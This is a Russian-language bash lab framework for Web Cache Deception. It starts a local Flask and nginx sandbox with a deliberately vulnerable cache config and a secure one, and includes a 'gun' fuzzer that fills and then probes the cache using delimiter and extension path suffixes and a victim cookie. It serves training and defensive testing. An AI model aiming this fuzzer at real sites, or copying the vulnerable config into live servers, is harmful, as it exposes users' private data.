#!/bin/bash
# =============================================================================
# Файл: wcd_framework.sh (UNIFIED) — ВЕРСИЯ FINAL FINAL
# Назначение: Единый самодостаточный фреймворк для изучения Web Cache Deception.
#   - Режим LAUNCHER: управление стендом (запуск/остановка, выбор конфига).
#   - Режим GUN: фаззинг разделителей с подробным логированием.
#   - Все проверки, логирование, пояснения в консоли.
#   - Никаких внешних зависимостей, кроме curl, python3, nginx, sudo.
# =============================================================================

# --- НАСТРОЙКИ ---------------------------------------------------------------
PROJECT_DIR="$HOME/BB/CORE-SWIGGER/wcd_flask_test"
RAM_DIR="/tmp/wcd_sandbox"
STATE_FILE="$RAM_DIR/.state"
FLASK_PORT=8081
NGINX_PORT=8080
LOG_FILE="$PROJECT_DIR/wcd.log"

# Обязательные файлы (должны быть созданы вручную)
REQUIRED_FILES=(
    "$PROJECT_DIR/app.py"
    "$PROJECT_DIR/nginx.conf"
    "$PROJECT_DIR/nginx_vuln.conf"
)

# Доступные конфигурации Nginx
declare -A NGINX_CONFIGS=(
    ["vuln"]="nginx_vuln.conf"
    ["secure"]="nginx.conf"
)
ACTIVE_CONFIG=""

# Переменные пулемёта
TARGET=""
COOKIE=""
DELIMITERS=(";" "." "?" "%00" "%23" "%3F" "%0A" "%09" "%20")
EXTENSIONS=(".css" ".js" ".jpg" ".ico")

# --- ЦВЕТА -------------------------------------------------------------------
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

# --- PID-ы -------------------------------------------------------------------
FLASK_PID=""
NGINX_PID=""

# =============================================================================
# ОБЩИЕ ФУНКЦИИ
# =============================================================================

# Логирование в файл
log_event() {
    local event_type="$1"
    local message="$2"
    local details="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "[$timestamp] [$event_type] $message" >> "$LOG_FILE"
    [[ -n "$details" ]] && echo "    $details" >> "$LOG_FILE"
}

# Проверка доступности цели (для пулемёта)
check_target() {
    local url="${1:-$TARGET}"
    [[ -z "$url" ]] && { 
        echo -e "${RED}[!] ОШИБКА: Цель не задана.${NC}"
        echo -e "${YELLOW}[*] Используй команду: set target <URL>${NC}"
        return 1
    }
    
    echo -e "${YELLOW}[*] ПРОВЕРКА: Стучусь по адресу $url ...${NC}"
    local code=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    
    if [[ "$code" =~ ^(200|302|301|401|403)$ ]]; then
        echo -e "${GREEN}[+] УСПЕХ: Цель доступна (HTTP код $code)${NC}"
        return 0
    else
        echo -e "${RED}[!] ОШИБКА: Цель недоступна (HTTP код $code)${NC}"
        echo -e "${YELLOW}[*] Возможные причины:${NC}"
        echo -e "${YELLOW}    - Стенд не запущен (запусти лаунчер командой ./wcd_framework.sh)${NC}"
        echo -e "${YELLOW}    - Неправильный порт (должен быть 8080)${NC}"
        return 1
    fi
}

# =============================================================================
# БЛОК LAUNCHER (УПРАВЛЕНИЕ СТЕНДОМ)
# =============================================================================

# Строгая проверка обязательных файлов
check_required_files() {
    echo -e "${CYAN}[ПРОВЕРКА] Сканирую обязательные файлы...${NC}"
    local missing=0
    
    for file in "${REQUIRED_FILES[@]}"; do
        if [[ -f "$file" ]]; then
            echo -e "  ${GREEN}[✓]${NC} $file"
        else
            echo -e "  ${RED}[✗]${NC} $file ${RED}ОТСУТСТВУЕТ${NC}"
            missing=1
        fi
    done
    
    if [[ $missing -eq 1 ]]; then
        echo ""
        echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}[!] ОБНАРУЖЕНЫ ОТСУТСТВУЮЩИЕ ФАЙЛЫ. ЗАПУСК НЕВОЗМОЖЕН.${NC}"
        echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${YELLOW}Необходимо СОЗДАТЬ ВРУЧНУЮ следующие файлы в директории:${NC}"
        echo -e "${CYAN}$PROJECT_DIR${NC}"
        echo ""
        
        if [[ ! -f "$PROJECT_DIR/nginx_vuln.conf" ]]; then
            echo -e "${YELLOW}--- ШАБЛОН ДЛЯ nginx_vuln.conf (скопируй и создай файл) ---${NC}"
            cat << 'EOF'
events { worker_connections 1024; }
http {
    client_body_temp_path /tmp/nginx_client_body;
    proxy_temp_path /tmp/nginx_proxy;
    fastcgi_temp_path /tmp/nginx_fastcgi;
    uwsgi_temp_path /tmp/nginx_uwsgi;
    scgi_temp_path /tmp/nginx_scgi;
    proxy_cache_path /tmp/nginx_cache levels=1:2 keys_zone=wcd:10m max_size=10m;
    server {
        listen 8080;
        location ~* \.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot|pdf|xml|txt|json|webp|bmp)(\?.*)?$ {
            proxy_cache wcd;
            proxy_cache_valid 200 60m;
            proxy_pass http://127.0.0.1:8081;
            add_header X-Cache-Status $upstream_cache_status;
            add_header X-Config-Version "vuln_1.0";
        }
        location / {
            proxy_pass http://127.0.0.1:8081;
            add_header X-Config-Version "vuln_1.0";
        }
    }
}
EOF
            echo -e "${YELLOW}--- КОНЕЦ ШАБЛОНА ---${NC}"
            echo ""
        fi
        
        if [[ ! -f "$PROJECT_DIR/app.py" ]]; then
            echo -e "${YELLOW}[!] Отсутствует бэкенд: $PROJECT_DIR/app.py${NC}"
            echo ""
        fi
        
        if [[ ! -f "$PROJECT_DIR/nginx.conf" ]]; then
            echo -e "${YELLOW}[!] Отсутствует защищённый конфиг: $PROJECT_DIR/nginx.conf${NC}"
            echo ""
        fi
        
        exit 1
    fi
    
    echo -e "${GREEN}[+] Все обязательные файлы найдены.${NC}"
    echo ""
}

# Сохранение состояния для пулемёта
save_state() {
    mkdir -p "$RAM_DIR"
    cat > "$STATE_FILE" << EOF
# WCD Sandbox State File
ACTIVE_CONFIG="$ACTIVE_CONFIG"
CONFIG_FILE="${NGINX_CONFIGS[$ACTIVE_CONFIG]}"
TARGET_URL="http://127.0.0.1:$NGINX_PORT/profile"
FLASK_PORT="$FLASK_PORT"
NGINX_PORT="$NGINX_PORT"
EOF
    echo -e "${GREEN}[+] Состояние сохранено в $STATE_FILE${NC}"
}

# Выбор конфигурации
select_config() {
    clear
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🛡️  WCD LAUNCHER — Выбор режима работы${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Выберите конфигурацию Nginx:${NC}"
    echo ""
    echo -e "  ${RED}1) vuln${NC}    — Уязвимый режим (без защиты, для отработки атак)"
    echo -e "  ${GREEN}2) secure${NC}  — Защищённый режим (с блокировкой WCD)"
    echo ""
    echo -e "${CYAN}Введи номер (1 или 2):${NC}"
    
    while true; do
        read -p "> " choice
        case $choice in
            1) ACTIVE_CONFIG="vuln"; break ;;
            2) ACTIVE_CONFIG="secure"; break ;;
            *) echo -e "${RED}[!] Введи 1 или 2${NC}" ;;
        esac
    done
    
    echo ""
    echo -e "${GREEN}[+] Выбран режим: ${ACTIVE_CONFIG}${NC}"
    echo -e "${GREEN}[+] Файл конфигурации: ${NGINX_CONFIGS[$ACTIVE_CONFIG]}${NC}"
    log_event "CONFIG" "Выбран режим" "$ACTIVE_CONFIG -> ${NGINX_CONFIGS[$ACTIVE_CONFIG]}"
    sleep 1
}

# Очистка при выходе
cleanup() {
    log_event "STOP" "Лаунчер завершает работу, очистка ресурсов"
    echo -e "\n${YELLOW}[!] Завершение работы, очистка ресурсов...${NC}"

    # Nginx
    if [[ -n "$NGINX_PID" ]] && kill -0 "$NGINX_PID" 2>/dev/null; then
        echo "   Останавливаю Nginx (PID $NGINX_PID)..."
        sudo nginx -s quit -c "$RAM_DIR/${NGINX_CONFIGS[$ACTIVE_CONFIG]}" 2>/dev/null || true
        sleep 0.5
        sudo kill -KILL "$NGINX_PID" 2>/dev/null || true
        log_event "STOP" "Nginx остановлен" "PID: $NGINX_PID"
    fi
    sudo fuser -k "$NGINX_PORT/tcp" 2>/dev/null || true

    # Flask
    if [[ -n "$FLASK_PID" ]] && kill -0 "$FLASK_PID" 2>/dev/null; then
        echo "   Останавливаю Flask (PID $FLASK_PID)..."
        kill -KILL -"$FLASK_PID" 2>/dev/null || true
        log_event "STOP" "Flask остановлен" "PID: $FLASK_PID"
    fi
    sudo fuser -k "$FLASK_PORT/tcp" 2>/dev/null || true

    # Удаление RAM-директории
    if [[ -d "$RAM_DIR" ]]; then
        rm -rf "$RAM_DIR"
        echo "   RAM-директория удалена: $RAM_DIR"
        log_event "INFO" "RAM-директория удалена" "$RAM_DIR"
    fi

    log_event "STOP" "Сессия завершена"
    echo "═══════════════════════════════════════════════════════════════" >> "$LOG_FILE"
    echo "" >> "$LOG_FILE"
    echo -e "${GREEN}[+] Очистка завершена. Лог: $LOG_FILE${NC}"
    exit 0
}

# Подготовка RAM
prepare_ram() {
    echo -e "${CYAN}[1/4] Подготовка RAM-окружения...${NC}"
    mkdir -p "$RAM_DIR" "$RAM_DIR/tools"
    
    cp "$PROJECT_DIR/app.py" "$RAM_DIR/"
    cp "$PROJECT_DIR/nginx.conf" "$RAM_DIR/"
    cp "$PROJECT_DIR/nginx_vuln.conf" "$RAM_DIR/"
    
    # Копируем самого себя как пулемёт (для запуска из лаунчера)
    cp "$0" "$RAM_DIR/tools/wcd_gun.sh"
    chmod +x "$RAM_DIR/tools/wcd_gun.sh"
    
    save_state
    
    log_event "INFO" "Файлы скопированы в RAM" "Источник: $PROJECT_DIR -> $RAM_DIR"
    echo -e "${GREEN}   [+] Файлы скопированы в $RAM_DIR${NC}"
}

# Запуск Flask
start_flask() {
    echo -e "${CYAN}[2/4] Запуск Flask (порт $FLASK_PORT)...${NC}"
    cd "$RAM_DIR"
    setsid python3 app.py > "$RAM_DIR/flask.log" 2>&1 &
    FLASK_PID=$!
    echo -n "   Ожидание Flask..."
    for i in {1..20}; do
        if nc -z localhost $FLASK_PORT 2>/dev/null; then
            echo -e " ${GREEN}готов (PID $FLASK_PID)${NC}"
            log_event "START" "Flask запущен" "PID: $FLASK_PID, Порт: $FLASK_PORT"
            return 0
        fi
        sleep 0.2
        echo -n "."
    done
    echo -e "\n${RED}[!] Flask не запустился${NC}"
    log_event "ERROR" "Flask не запустился" "Порт: $FLASK_PORT"
    return 1
}

# Запуск Nginx
start_nginx() {
    local config_file="${NGINX_CONFIGS[$ACTIVE_CONFIG]}"
    echo -e "${CYAN}[3/4] Запуск Nginx (порт $NGINX_PORT) с конфигом: ${BLUE}$config_file${NC}"
    mkdir -p "$RAM_DIR/nginx_temp" "$RAM_DIR/nginx_cache"
    
    sudo nginx -c "$RAM_DIR/$config_file" 2>/dev/null
    NGINX_PID=$(sudo cat "$RAM_DIR/nginx.pid" 2>/dev/null | head -1)
    
    if [[ -n "$NGINX_PID" ]]; then
        echo -e "${GREEN}   [+] Nginx запущен (PID $NGINX_PID)${NC}"
        log_event "START" "Nginx запущен" "PID: $NGINX_PID, Порт: $NGINX_PORT, Конфиг: $config_file"
    else
        echo -e "${YELLOW}   [!] PID Nginx не определён, но процесс может работать${NC}"
        log_event "WARN" "PID Nginx не определён" "Конфиг: $config_file"
    fi
}

# Перезапуск с выбором конфига
restart_services() {
    echo -e "${YELLOW}[!] Перезапуск сервисов...${NC}"
    log_event "INFO" "Перезапуск сервисов начат"
    
    # Останавливаем всё
    if [[ -n "$NGINX_PID" ]] && kill -0 "$NGINX_PID" 2>/dev/null; then
        sudo nginx -s quit -c "$RAM_DIR/${NGINX_CONFIGS[$ACTIVE_CONFIG]}" 2>/dev/null || true
        sleep 0.5
        sudo kill -KILL "$NGINX_PID" 2>/dev/null || true
    fi
    sudo fuser -k "$NGINX_PORT/tcp" 2>/dev/null || true
    
    if [[ -n "$FLASK_PID" ]] && kill -0 "$FLASK_PID" 2>/dev/null; then
        kill -KILL -"$FLASK_PID" 2>/dev/null || true
    fi
    sudo fuser -k "$FLASK_PORT/tcp" 2>/dev/null || true
    FLASK_PID=""; NGINX_PID=""
    sleep 1
    
    # Выбираем новый конфиг
    select_config
    
    [[ -d "$RAM_DIR" ]] && rm -rf "$RAM_DIR"
    prepare_ram
    start_flask || { echo -e "${RED}[!] Не удалось запустить Flask${NC}"; return 1; }
    start_nginx
    log_event "INFO" "Сервисы перезапущены с конфигом: ${NGINX_CONFIGS[$ACTIVE_CONFIG]}"
}

# Горячее переключение конфига
switch_config() {
    echo -e "${YELLOW}[!] Горячее переключение конфигурации...${NC}"
    select_config
    local config_file="${NGINX_CONFIGS[$ACTIVE_CONFIG]}"
    
    save_state
    
    echo -e "${CYAN}[*] Перезагружаю Nginx с новым конфигом: $config_file${NC}"
    if sudo nginx -s reload -c "$RAM_DIR/$config_file" 2>/dev/null; then
        echo -e "${GREEN}[+] Конфигурация переключена на $ACTIVE_CONFIG${NC}"
        log_event "CONFIG" "Горячее переключение" "$ACTIVE_CONFIG -> $config_file"
    else
        echo -e "${RED}[!] Ошибка перезагрузки. Возможно, Nginx не запущен.${NC}"
        echo -e "${YELLOW}[*] Попробуйте 'restart' для полного перезапуска.${NC}"
        return 1
    fi
}

# Статус стенда
show_status() {
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}СТАТУС СТЕНДА${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    if [[ -n "$FLASK_PID" ]] && kill -0 "$FLASK_PID" 2>/dev/null; then
        echo -e "  Flask:    ${GREEN}● РАБОТАЕТ${NC} (PID $FLASK_PID, порт $FLASK_PORT)"
    else
        echo -e "  Flask:    ${RED}○ ОСТАНОВЛЕН${NC}"
    fi
    
    if sudo lsof -i :$NGINX_PORT 2>/dev/null | grep -q nginx; then
        echo -e "  Nginx:    ${GREEN}● РАБОТАЕТ${NC} (порт $NGINX_PORT)"
        echo -e "  Режим:    ${BLUE}$ACTIVE_CONFIG${NC} (${NGINX_CONFIGS[$ACTIVE_CONFIG]})"
    else
        echo -e "  Nginx:    ${RED}○ ОСТАНОВЛЕН${NC}"
    fi
    
    echo -e "\n  ${CYAN}Цель для пулемёта:${NC} http://127.0.0.1:$NGINX_PORT/profile"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# Запуск пулемёта (режим gun) из лаунчера
run_gun() {
    local target="http://127.0.0.1:$NGINX_PORT/profile"
    echo -e "${CYAN}[*] Запускаю пулемёт с целью: $target${NC}"
    echo -e "${CYAN}[*] Режим стенда: $ACTIVE_CONFIG${NC}"
    echo ""
    
    # Переходим в директорию с пулемётом и запускаем его
    cd "$RAM_DIR/tools"
    ./wcd_gun.sh gun "$target"
    cd "$RAM_DIR"
    
    echo ""
    echo -e "${GREEN}[+] Пулемёт завершил работу.${NC}"
    log_event "ACTION" "Пулемёт завершил работу"
}

# Меню лаунчера
show_launcher_menu() {
    clear
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🛡️  WCD LAUNCHER — Песочница в RAM${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}Flask:${NC} localhost:$FLASK_PORT  |  ${GREEN}Nginx:${NC} localhost:$NGINX_PORT"
    echo -e "  ${GREEN}RAM dir:${NC} $RAM_DIR"
    echo -e "  ${GREEN}Лог:${NC} $LOG_FILE"
    echo -e "  ${BLUE}Режим:${NC} ${ACTIVE_CONFIG:-НЕ ВЫБРАН} (${NGINX_CONFIGS[$ACTIVE_CONFIG]:-})"
    echo ""
    echo -e "${YELLOW}Команды:${NC}"
    echo "  gun           — запустить пулемёт (цель подставится автоматически)"
    echo "  test <url>    — тестовый запрос (curl -I)"
    echo "  log           — последние 20 строк лога"
    echo "  logfull       — открыть лог в less"
    echo "  restart       — полный перезапуск с выбором режима"
    echo "  switch        — сменить режим на лету (hot reload)"
    echo "  status        — статус стенда"
    echo "  help          — это меню"
    echo "  exit          — выход и очистка"
    echo ""
}

# Основной цикл лаунчера
launcher_main() {
    check_required_files
    
    echo "" >> "$LOG_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$LOG_FILE"
    log_event "START" "=== НОВАЯ СЕССИЯ WCD LAUNCHER ==="
    echo "═══════════════════════════════════════════════════════════════" >> "$LOG_FILE"

    select_config
    prepare_ram
    start_flask || exit 1
    start_nginx || exit 1
    log_event "INFO" "Лаунчер готов к работе с конфигом: ${NGINX_CONFIGS[$ACTIVE_CONFIG]}"
    
    echo -e "${GREEN}[+] Стенд успешно запущен!${NC}"
    sleep 1

    while true; do
        show_launcher_menu
        read -p "wcd-launcher > " cmd arg
        case $cmd in
            gun)
                run_gun
                echo ""
                read -p "Нажмите Enter для возврата в меню..."
                ;;
            test)
                [[ -z "$arg" ]] && echo -e "${RED}Укажи URL${NC}" || {
                    log_event "ACTION" "Тестовый запрос" "$arg"
                    echo -e "${GREEN}Запрос к $arg :${NC}"
                    curl -s -I "$arg" | head -10
                }
                ;;
            log)    tail -20 "$LOG_FILE" ;;
            logfull) less "$LOG_FILE" ;;
            restart) restart_services ;;
            switch)  switch_config ;;
            status)  show_status ;;
            help)    show_launcher_menu ;;
            exit|quit) exit 0 ;;
            *) [[ -n "$cmd" ]] && echo -e "${RED}Неизвестная команда: $cmd${NC}" ;;
        esac
        # Пауза только если это не gun (у gun своя пауза внутри)
        if [[ "$cmd" != "gun" ]]; then
            echo ""
            read -p "Нажмите Enter для продолжения..."
        fi
    done
}

# =============================================================================
# БЛОК GUN (ПУЛЕМЁТ)
# =============================================================================

banner_gun() {
    clear
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🔫 WCD GUN — пулемёт для тестирования Web Cache Deception${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}🎯 Target:${NC} ${TARGET:-НЕ ЗАДАН}"
    echo -e "  ${YELLOW}🍪 Cookie:${NC} ${COOKIE:-НЕТ}"
    echo ""
}

# Основная функция обстрела
fire() {
    echo -e "\n${WHITE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║  🔥 НАЧАЛО ОБСТРЕЛА                                           ║${NC}"
    echo -e "${WHITE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    
    check_target || return 1
    
    local total=$((${#DELIMITERS[@]} * ${#EXTENSIONS[@]}))
    local cur=0
    
    echo -e "\n${CYAN}[*] ИНФО: Всего будет проверено векторов: ${total}${NC}"
    echo -e "${CYAN}[*] ИНФО: Разделителей: ${#DELIMITERS[@]}, Расширений: ${#EXTENSIONS[@]}${NC}"
    
    # Фаза 1: Прогрев
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔥 ФАЗА 1: ПРОГРЕВ КЭША                                      ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий ЖЕРТВЫ — запись ответов в кэш              ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[*] ПОЯСНЕНИЕ: Сейчас я делаю ПЕРВЫЙ круг запросов.${NC}"
    echo -e "${CYAN}    Я отправляю запросы С КУКАМИ (как жертва).${NC}"
    echo -e "${CYAN}    Ответы НЕ анализируются — они просто ЗАПИСЫВАЮТСЯ в кэш.${NC}"
    echo -e "${CYAN}    Это имитация того, как легитимный пользователь заходит на сайт.${NC}"
    echo ""
    
    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((cur++))
            local url="${TARGET}${delim}test${ext}"
            
            printf "  [%3d/%3d] ПРОГРЕВ: %s" $cur $total "$url"
            curl -s -o /dev/null -b "$COOKIE" "$url" 2>/dev/null
            echo -e " ${GREEN}✓ (ответ записан в кэш, если сервер разрешил)${NC}"
            sleep 0.2
        done
    done
    
    echo ""
    echo -e "${CYAN}[*] ФАЗА 1 ЗАВЕРШЕНА. Все $total запросов отправлены.${NC}"
    echo -e "${CYAN}[*] Жду 2 секунды, чтобы Nginx точно сохранил ответы в кэш...${NC}"
    sleep 2
    
    # Фаза 2: Проверка
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔍 ФАЗА 2: ПРОВЕРКА КЭША                                     ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий АТАКУЮЩЕГО — попытка украсть кэш           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[*] ПОЯСНЕНИЕ: Сейчас я делаю ВТОРОЙ круг запросов.${NC}"
    echo -e "${CYAN}    Я отправляю ТЕ ЖЕ запросы, но анализирую заголовок X-Cache-Status.${NC}"
    echo -e "${CYAN}    Это имитация атакующего, который пытается получить данные из кэша.${NC}"
    echo ""
    
    cur=0
    local hits=0
    local bypasses=0
    local misses=0
    local errors=0
    
    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((cur++))
            local url="${TARGET}${delim}test${ext}"
            
            local resp=$(curl -s -I -b "$COOKIE" "$url" 2>/dev/null)
            local cache=$(echo "$resp" | grep -i "^X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
            local bypass=$(echo "$resp" | grep -i "^X-WCD-Bypass" | head -1 | awk '{print $2}' | tr -d '\r')
            local code=$(echo "$resp" | head -1 | awk '{print $2}')
            
            printf "[%3d/%3d] " $cur $total
            
            case "$cache" in
                HIT)
                    echo -e "${RED}[!] ПРОБИТИЕ!${NC} $url"
                    echo -e "         → HTTP $code, Cache: ${RED}$cache${NC}, Bypass: ${bypass:-нет}"
                    echo -e "         ${RED}⚠️  ПОЯСНЕНИЕ: Кэш ОТДАЛ приватные данные!${NC}"
                    echo -e "         ${RED}    Это значит, что атакующий УКРАЛ данные жертвы.${NC}"
                    echo -e "         ${RED}    УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА.${NC}"
                    ((hits++))
                    ;;
                BYPASS)
                    echo -e "${GREEN}[✓] ЗАЩИТА${NC}   $url"
                    echo -e "         → HTTP $code, Cache: ${GREEN}$cache${NC}, Bypass: ${bypass:-нет}"
                    echo -e "         ${GREEN}🛡️  ПОЯСНЕНИЕ: Защита сработала!${NC}"
                    echo -e "         ${GREEN}    Nginx НЕ ВЗЯЛ ответ из кэша, а пошёл на бэкенд.${NC}"
                    echo -e "         ${GREEN}    Атака ОТРАЖЕНА.${NC}"
                    ((bypasses++))
                    ;;
                MISS)
                    echo -e "${YELLOW}[?] MISS${NC}     $url"
                    echo -e "         → HTTP $code, Cache: ${YELLOW}$cache${NC}, Bypass: ${bypass:-нет}"
                    echo -e "         ${YELLOW}📝 ПОЯСНЕНИЕ: Промах кэша.${NC}"
                    echo -e "         ${YELLOW}    Ответ НЕ БЫЛ взят из кэша (его там нет).${NC}"
                    ((misses++))
                    ;;
                "")
                    echo -e "${BLUE}[ ] NO_HEADER${NC} $url"
                    echo -e "         → HTTP $code, Cache: ${BLUE}отсутствует${NC}, Bypass: ${bypass:-нет}"
                    ((errors++))
                    ;;
                *)
                    echo -e "${BLUE}[ ] $cache${NC}   $url"
                    echo -e "         → HTTP $code, Cache: $cache, Bypass: ${bypass:-нет}"
                    ((errors++))
                    ;;
            esac
            sleep 0.1
        done
    done
    
    # Итоги
    echo ""
    echo -e "${WHITE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║  📊 ИТОГИ ОБСТРЕЛА                                             ║${NC}"
    echo -e "${WHITE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "  ${CYAN}Всего проверено векторов:${NC} ${WHITE}$total${NC}"
    echo ""
    echo -e "  ${RED}🔴 ПРОБИТИЙ (HIT):${NC}        ${RED}$hits${NC}"
    echo -e "  ${GREEN}🟢 ЗАЩИТА (BYPASS):${NC}       ${GREEN}$bypasses${NC}"
    echo -e "  ${YELLOW}🟡 ПРОМАХОВ (MISS):${NC}       ${YELLOW}$misses${NC}"
    echo -e "  ${BLUE}🔵 ОШИБОК:${NC}               ${BLUE}$errors${NC}"
    echo ""
    
    echo -e "${WHITE}───────────────────────────────────────────────────────────────${NC}"
    if [[ $hits -gt 0 ]]; then
        echo -e "${RED}⚠️  ВЕРДИКТ: ОБНАРУЖЕНА УЯЗВИМОСТЬ Web Cache Deception!${NC}"
    elif [[ $bypasses -eq $total ]]; then
        echo -e "${GREEN}✅ ВЕРДИКТ: ЗАЩИТА РАБОТАЕТ ИДЕАЛЬНО!${NC}"
    elif [[ $misses -eq $total ]]; then
        echo -e "${YELLOW}📝 ВЕРДИКТ: КЭШ ПУСТ.${NC}"
    else
        echo -e "${BLUE}❓ ВЕРДИКТ: СМЕШАННЫЙ РЕЗУЛЬТАТ.${NC}"
    fi
    echo -e "${WHITE}═══════════════════════════════════════════════════════════════${NC}"
}

# Вспомогательные функции пулемёта
set_target() { 
    TARGET="$1"
    echo -e "${GREEN}[+] Цель установлена: $TARGET${NC}"
    check_target "$TARGET"
}

set_cookie() { 
    COOKIE="$1"
    echo -e "${GREEN}[+] Кука установлена: $COOKIE${NC}"
    echo -e "${CYAN}[*] Эта кука будет использоваться в фазе ПРОГРЕВА (имитация жертвы).${NC}"
}

show_gun_help() {
    echo ""
    echo -e "${WHITE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║  📋 КОМАНДЫ ПУЛЕМЁТА                                          ║${NC}"
    echo -e "${WHITE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}set target <URL>${NC}     — установить цель"
    echo -e "  ${GREEN}set cookie <COOKIE>${NC}   — установить куку"
    echo -e "  ${GREEN}fire${NC}                  — 🔥 ОТКРЫТЬ ОГОНЬ (полный цикл)"
    echo -e "  ${GREEN}check [URL]${NC}           — проверить доступность"
    echo -e "  ${GREEN}help${NC}                  — это меню"
    echo -e "  ${GREEN}exit / quit${NC}           — выход"
    echo ""
}

# Главная функция пулемёта
gun_main() {
    # Если передан аргумент (цель) – используем
    if [[ -n "$1" ]] && [[ "$1" != "gun" ]]; then
        TARGET="$1"
    elif [[ -n "$2" ]]; then
        TARGET="$2"
    fi
    
    # Пытаемся прочитать состояние от лаунчера
    if [[ -f "$STATE_FILE" ]]; then
        source "$STATE_FILE"
        [[ -z "$TARGET" ]] && TARGET="$TARGET_URL"
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${BLUE}[*] ОБНАРУЖЕНО СОСТОЯНИЕ ЛАУНЧЕРА:${NC}"
        echo -e "${BLUE}    Режим стенда: ${WHITE}$ACTIVE_CONFIG${BLUE} (файл: $CONFIG_FILE)${NC}"
        echo -e "${BLUE}    Цель: ${WHITE}$TARGET_URL${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        case "$ACTIVE_CONFIG" in
            vuln)   
                echo -e "${RED}[!] ВНИМАНИЕ: Стенд в УЯЗВИМОМ режиме (vuln)${NC}"
                echo -e "${RED}    Защита ОТКЛЮЧЕНА. WCD ДОЛЖЕН сработать.${NC}"
                ;;
            secure) 
                echo -e "${GREEN}[✓] Стенд в ЗАЩИЩЁННОМ режиме (secure)${NC}"
                echo -e "${GREEN}    Защита ВКЛЮЧЕНА. WCD НЕ ДОЛЖЕН сработать.${NC}"
                ;;
        esac
        echo ""
    fi
    
    banner_gun
    [[ -z "$TARGET" ]] && read -p "🎯 Цель (например, http://127.0.0.1:8080/profile): " TARGET
    [[ -z "$COOKIE" ]] && read -p "🍪 Кука (опционально, Enter чтобы пропустить): " COOKIE
    
    echo ""
    echo -e "${GREEN}[+] Цель: ${WHITE}$TARGET${NC}"
    echo -e "${GREEN}[+] Кука: ${WHITE}${COOKIE:-НЕТ}${NC}"
    echo ""
    check_target || echo -e "${YELLOW}[*] Продолжаю (смени цель через 'set target')${NC}"
    echo -e "\n${CYAN}Введи 'help' для списка команд, 'fire' для полного обстрела${NC}"
    
    while true; do
        echo ""
        read -p "wcd-gun > " cmd arg1 arg2
        case $cmd in
            set) 
                case $arg1 in
                    target) set_target "$arg2" ;;
                    cookie) set_cookie "$arg2" ;;
                    *) echo -e "${RED}Используй: set target <URL> или set cookie <COOKIE>${NC}" ;;
                esac
                ;;
            fire)       fire ;;
            check)      check_target "$arg1" ;;
            help)       show_gun_help ;;
            exit|quit)  echo -e "${YELLOW}Выход из пулемёта...${NC}"; break ;;
            "")         ;;
            *)          echo -e "${RED}Неизвестная команда. 'help' для списка${NC}" ;;
        esac
    done
}

# =============================================================================
# ТОЧКА ВХОДА
# =============================================================================
if [[ "$1" == "gun" ]]; then
    # Режим пулемёта (вызывается из лаунчера или напрямую)
    shift
    gun_main "$@"
else
    # Режим лаунчера (по умолчанию)
    # Устанавливаем trap только для лаунчера
    trap cleanup EXIT SIGINT
    launcher_main
fi